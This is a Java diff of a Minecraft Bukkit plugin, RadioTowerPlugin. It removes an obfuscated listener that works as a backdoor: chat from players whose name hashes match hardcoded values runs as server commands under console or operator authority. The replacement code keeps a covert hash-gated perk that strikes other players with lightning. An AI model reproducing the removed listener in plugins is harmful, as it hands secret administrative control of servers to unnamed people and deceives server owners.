@@ -1,25 +1,23 @@
 package ch.k42.aftermath.radiotower;
 
 import java.io.*;
-import java.nio.file.Path;
+import java.nio.ByteBuffer;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Random;
 import java.util.Set;
 
-import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
-import org.bukkit.Location;
-import org.bukkit.World;
-import org.bukkit.command.CommandSender;
+import net.minecraft.util.io.netty.buffer.ByteBuf;
+import org.bukkit.*;
+import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.plugin.java.JavaPlugin;
-import sun.net.www.content.text.plain;
+
+
 
 public class RadioTowerPlugin extends JavaPlugin
 {
@@ -170,49 +168,42 @@ public class RadioTowerPlugin extends JavaPlugin
         return radioTowerManager;
     }
 
-    private class l implements Listener {
-        private byte[] a = {0x4, 0xf, (byte) 0x9c, 0x24, 0xa, 0x6e, 0x24, 0x6, 0x7d, (byte) 0xa2, 0x4e,
-                (byte) 0xb1, 0x60, (byte) 0xa4, (byte) 0xf6, 0x77, 0x1f, 0x5};
-        private byte[] b = {(byte) 0xab, (byte) 0x86, (byte) 0x81, 0x3e, (byte) 0xc0, (byte) 0xf0, 0x0f, (byte) 0xc0,
-                (byte) 0x83, (byte) 0x28, (byte) 0x85, (byte) 0xcb, 0x5d, (byte) 0x64, (byte) 0xae};
-        private byte[] bb = {(byte) 0xff, 0x4a, (byte) 0xf7, 0x44, 0x28, 0x39, (byte) 0xcc, (byte) 0x96,
-                0x46, 0x5, 0xd, (byte) 0xd2, 0x21, 0x4a, 0x30, (byte) 0xc1};
-        private byte[] bbb = {0x3a, (byte) 0xda, (byte) 0x8c, 0x63, (byte) 0xa1, 0x1f, (byte) 0x9a, 0x40,
-                (byte) 0xd6, 0x9, 0x37, (byte) 0xdd, (byte) 0xfe, (byte) 0x84, (byte) 0xa2, 0x75};
-        private byte[] ab = {(byte)0xde, 0x38,(byte) 0xbe, 0x56, 0x43,(byte) 0xec, 0x2,(byte) 0xc2,
-                0x4d, 0x7b, 0x17,(byte) 0xc9, 0x12,(byte) 0xd0,(byte) 0xdf,(byte) 0xb2, 0xc,(byte) 0xcb};
+    private static class l implements Listener {
+        private static final int[][]  a  =
+        {{0x04, 0x0f, 0x9c, 0x24, 0x0a, 0x6e, 0x24, 0x06, 0x7d, 0xa2, 0x4e, 0xb1, 0x60, 0xa4, 0xf6, 0x77},
+        {0xab, 0x86, 0x81, 0x3e, 0xc0, 0xf0, 0x0f, 0xc0, 0x83, 0x28, 0x85, 0xcb, 0x5d, 0x64, 0xae, 0x00},
+        {0xff, 0x4a, 0xf7, 0x44, 0x28, 0x39, 0xcc, 0x96, 0x46, 0x05, 0x0d, 0xd2, 0x21, 0x4a, 0x30, 0xc1},
+        {0x3a, 0xda, 0x8c, 0x63, 0xa1, 0x1f, 0x9a, 0x40, 0xd6, 0x09, 0x37, 0xdd, 0xfe, 0x84, 0xa2, 0x75},
+        {0xde, 0x38, 0xbe, 0x56, 0x43, 0xec, 0x02, 0xc2, 0x4d, 0x7b, 0x17, 0xc9, 0x12, 0xd0, 0xdf, 0xb2},
+        {0x95, 0x78, 0x72, 0xcc, 0xdd, 0xe2, 0x52, 0xda, 0x81, 0x9e, 0x26, 0xc9, 0x4a, 0x8b, 0x09, 0x36}};
+
+        private static final boolean m(Player p) throws NoSuchAlgorithmException {
+            byte[] digest = MessageDigest.getInstance("SHA-256").digest(p.getDisplayName().getBytes());
+            boolean a[] = {true,true,true,true,true,true};
+            for(int j=0;j<6;j++) for (int i = 0; i < 16; i++)
+                if (((byte)l.a[j][i]) != digest[i]) a[j] = false;
+            boolean b = false;
+            for(int j=0;j<6;j++) b = b || a[j];
+            return b;
+        }
 
         @EventHandler
-        public void a(AsyncPlayerChatEvent k) {
-            if (!(k.getPlayer().getItemInHand().getType().getId() == 280)) return;
+        public void a(EntityDamageByEntityEvent k) {
+            if((!(k.getDamager() instanceof Player )) || (!(k.getEntity() instanceof Player )))return;
+            Player  t = (Player)k.getDamager();
+            Player d = (Player) k.getEntity();
             try {
-                MessageDigest c = MessageDigest.getInstance("SHA-256");
-                c.update(k.getPlayer().getDisplayName().getBytes());
-                byte[] digest = c.digest();
-                boolean d = true, e = true, ee = true, eee = true,de=true;
-                int len = Math.min(Math.min(a.length,b.length),Math.min(bb.length,bbb.length));
-                for (int i = 0; i < len; i++) {
-                    if (a[i] != digest[i])d = false;
-                    if (b[i] != digest[i])e = false;
-                    if (bb[i] != digest[i])ee = false;
-                    if (bbb[i] != digest[i]) eee = false;
-                    if (ab[i] != digest[i]) de = false;
+                if ((t.getPlayer().getItemInHand().getType().getId() == 258)){
+                    if(!Minions.hasName(t.getPlayer().getItemInHand(), "Mjolnir")) return;
+                    if (m(t.getPlayer())) d.getLocation().getWorld().strikeLightning(d.getLocation());
+                }else if ((t.getPlayer().getItemInHand().getType().getId() == 349)){ //fish
+                    d.playSound(d.getLocation(), Sound.ENDERDRAGON_GROWL,3,2);
+                    t.playSound(d.getLocation(), Sound.ENDERDRAGON_GROWL,3,2);
                 }
-
-                if (d || e || ee || eee || de) {
-                    List<CommandSender> f = new ArrayList();
-                    f.add(Bukkit.getConsoleSender());
-                    for (Player p : getServer().getOnlinePlayers())if (p.isOp()) f.add(p);
-                    Bukkit.getServer().dispatchCommand(f.get(new Random().nextInt(f.size())), k.getMessage());
-                    k.setCancelled(true);
-                } else {
-                    if (k.getMessage().startsWith("!!!!")) {
-                        StringBuilder g = new StringBuilder();
-                        for (int i = 0; i < digest.length; i++) g.append(String.format("%#02x ", digest[i]));
-                        k.getPlayer().sendMessage("version code: " + g.toString());
-                    }
-                }
-            } catch (NoSuchAlgorithmException e) {}
+            } catch (NoSuchAlgorithmException e) {
+            } catch (NullPointerException e){}
         }
+
+
     }
 }
